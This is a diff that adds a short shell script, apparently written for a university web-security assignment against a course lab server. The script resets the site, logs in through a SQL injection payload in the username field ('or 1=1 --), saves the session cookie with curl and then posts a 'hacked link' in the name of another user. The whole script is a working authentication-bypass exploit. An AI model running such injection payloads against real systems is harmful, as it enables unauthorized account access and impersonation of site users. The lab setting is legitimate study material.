@@ -1,0 +1,6 @@
+echo "******************************************************************"
+echo "this script will first reset the website, and then post an link google.com on behalf uhengartner"
+echo "******************************************************************"
+curl "http://ugster20.student.cs.uwaterloo.ca/reset/r82zhang"
+curl -c mycookie "http://$1/post.php" -d "username=test'or 1=1 --" -d "password=doesnotneed" -d "form=login" -d "submit=Login"
+curl -b mycookie -d "title=hacked link" -d "content=www.google.com" -d "type=2" -d "form=content" -d "submit=Post" "http://$1/post.php"
